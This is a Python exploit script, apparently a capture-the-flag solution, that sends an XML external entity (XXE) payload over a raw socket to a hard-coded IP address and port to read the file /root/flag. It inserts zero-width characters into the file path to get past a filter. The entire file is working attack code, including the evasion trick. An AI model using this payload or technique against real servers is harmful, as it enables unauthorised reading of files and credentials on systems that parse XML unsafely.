#!/usr/bin/env python3
import socket, sys

HOST = "54.72.82.22"
PORT = 8031
TIMEOUT = 10

# the invisible separator (ZERO WIDTH NON-JOINER)
zwc = "\u200c"

target = "root/flag"
# insert zero-width char between every character
obf = zwc.join(list(target))

pre = '<?xml version="1.0"?><!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///'
post = '"> ]><request><id>&xxe;</id></request>'

payload_str = pre + obf + post
payload = payload_str.encode('utf-8')

req_lines = [
    "POST /fetch_user HTTP/1.1",
    f"Host: {HOST}:{PORT}",
    "User-Agent: zwc-inserter/1.0",
    "Accept: */*",
    "Content-Type: application/xml",
    f"Content-Length: {len(payload)}",
    "Connection: close",
    "",
    ""
]

request = ("\r\n".join(req_lines)).encode() + payload

try:
    s = socket.create_connection((HOST, PORT), timeout=TIMEOUT)
    s.sendall(request)
    s.settimeout(TIMEOUT)
    resp = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        resp += chunk
    s.close()
    print(resp.decode(errors="replace"))
except socket.timeout:
    print("timeout")
except Exception as e:
    print("error:", e)
    sys.exit(1)
